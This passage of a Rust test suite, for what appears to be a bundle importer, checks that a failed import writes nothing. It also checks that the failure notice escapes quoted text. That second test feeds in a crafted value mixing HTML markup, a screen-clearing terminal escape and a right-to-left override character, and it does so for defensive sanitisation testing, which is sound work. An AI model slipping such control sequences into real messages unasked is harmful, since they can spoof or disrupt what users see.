        assert!(store.borrow().get(&LayoutId::new("half")).is_some());
        assert!(
            store
                .borrow()
                .komponent(&KomponentId::new("half-pill"))
                .is_none()
        );
        assert!(dir.join("half.toml").is_file());

        read_only(&components, true);
        read_only(&dir, true);
        let refused = import(&bundle_of("none", sharing("none")));
        read_only(&components, false);
        read_only(&dir, false);
        refused.expect_err("nothing could be written");
        assert!(
            !services::state::get().bundles.contains_key("none"),
            "no record claims what nobody wrote"
        );
        assert!(store.borrow().get(&LayoutId::new("none")).is_none());
        assert!(
            !bundles::assets_dir("none").exists(),
            "the pictures went with it"
        );
    }

    /// The notice of a failed import quotes the bundle's findings in the user's language, with whatever they quote written out, and the notice daemon keeps the body from being read as markup.
    #[test]
    fn the_notice_of_a_failed_import_writes_out_what_it_quotes() {
        let mut report = util::report::Report::default();
        report.error(util::report::Finding::new(
            "layouts/x.toml",
            "",
            util::report::Message::verbatim("`<b>bar</b>\u{1b}[2J\u{202e}` is wrong"),
        ));
        let body = bundles::failure_body(&report);
        assert!(
            !body.contains('\u{1b}') && !body.contains('\u{202e}'),
            "{body}"
        );
        assert!(body.contains("\\u{1b}[2J\\u{202e}"), "{body}");
    }
}
